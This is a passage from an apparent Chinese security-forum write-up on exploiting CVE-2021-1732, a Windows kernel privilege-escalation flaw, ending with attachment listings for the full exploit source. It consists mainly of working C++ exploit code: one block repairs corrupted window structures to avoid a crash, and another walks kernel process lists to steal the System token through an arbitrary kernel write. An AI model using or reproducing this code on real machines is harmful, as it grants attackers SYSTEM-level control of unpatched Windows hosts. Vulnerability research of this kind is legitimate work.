
### 7. 恢复漏洞防止蓝屏

完成提权后对修改过的`tagWND`结构进行恢复。

```
//Recovery bug
g_dwpWndKernel_heap_offset2 = *(ULONG_PTR*)((PBYTE)pWnd2 + g_dwKernel_pWnd_offset);
ULONG_PTR dwpWnd0_to_pWnd2_kernel_heap_offset = *(ULONGLONG*)((PBYTE)g_pWnd[0] + 0x128);
if (dwpWnd0_to_pWnd2_kernel_heap_offset < g_dwpWndKernel_heap_offset2) {
    dwpWnd0_to_pWnd2_kernel_heap_offset = (g_dwpWndKernel_heap_offset2 - dwpWnd0_to_pWnd2_kernel_heap_offset);

    DWORD dwFlag = *(ULONGLONG*)((PBYTE)pWnd2 + g_dwModifyOffsetFlag_offset);
    dwFlag &= ~0x800;
    SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd2_kernel_heap_offset + g_dwModifyOffsetFlag_offset, dwFlag);  //Modify remove flag

    PVOID pAlloc = g_fRtlAllocateHeap((PVOID) * (ULONG_PTR*)(__readgsqword(0x60) + 0x30), 0, g_dwMyWndExtra);
    SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd2_kernel_heap_offset + g_dwModifyOffset_offset, (LONG_PTR)pAlloc);  //Modify offset to memory address

    ULONGLONG ululStyle = *(ULONGLONG*)((PBYTE)g_pWnd[1] + g_dwExStyle_offset);
    ululStyle |= 0x4000000000000000L;//WS_CHILD
    SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwExStyle_offset, ululStyle);  //Modify add style WS_CHILD

    ULONG_PTR pMyMenu = SetWindowLongPtr(g_hWnd[1], GWLP_ID, (LONG_PTR)pSPMenu);
    //free pMyMenu

    ululStyle &= ~0x4000000000000000L;//WS_CHILD
    SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwExStyle_offset, ululStyle);  //Modify Remove Style WS_CHILD

    std::cout << "Recovery bug prevent blue screen." << std::endl;
}
```

### 8. 最终我们构造的Exploit代码为：

```
附件.
```

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于 2021-3-9 11:10

被`KernelKiller`编辑，原因：

[#漏洞利用](https://bbs.kanxue.com/forum-150-1-154.htm)

[#Windows](https://bbs.kanxue.com/forum-150-1-160.htm)

上传的附件：

- [CVE-2021-1732研究及Exploit开发.pdf](javascript:void(0);)

  （892.45kb，313次下载）

- [CVE-2021-1732\_Exploit.cpp](javascript:void(0);)

  （15.85kb，428次下载）

```
std::cout << "Get current kernel eprocess: " << pMyEProcess << std::endl;

ULONG_PTR pSystemEProcess = 0;

ULONG_PTR pNextEProcess = pMyEProcess;
for (int i = 0; i < 500; i++) {
    ReadKernelMemoryQQWORD(pNextEProcess + g_dwEPROCESS_ActiveProcessLinks_offset, ululValue1, ululValue2);
    pNextEProcess = ululValue1 - g_dwEPROCESS_ActiveProcessLinks_offset;

    ReadKernelMemoryQQWORD(pNextEProcess + g_dwEPROCESS_UniqueProcessId_offset, ululValue1, ululValue2);

    ULONG_PTR nProcessId = ululValue1;
    if (nProcessId == 4) { // System process id
        pSystemEProcess = pNextEProcess;
        std::cout << "System kernel eprocess: " << std::hex << pSystemEProcess << std::endl;

        ReadKernelMemoryQQWORD(pSystemEProcess + g_dwEPROCESS_Token_offset, ululValue1, ululValue2);
        ULONG_PTR pSystemToken = ululValue1;

        ULONG_PTR pMyEProcessToken = pMyEProcess + g_dwEPROCESS_Token_offset;

        //Write kernel memory
        LONG_PTR old = SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwModifyOffset_offset, (LONG_PTR)pMyEProcessToken);
        SetWindowLongPtr(g_hWnd[1], 0, (LONG_PTR)pSystemToken);  //Modify offset to memory address
        SetWindowLongPtr(g_hWnd[0], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwModifyOffset_offset, (LONG_PTR)old);
        break;
    }
}
```
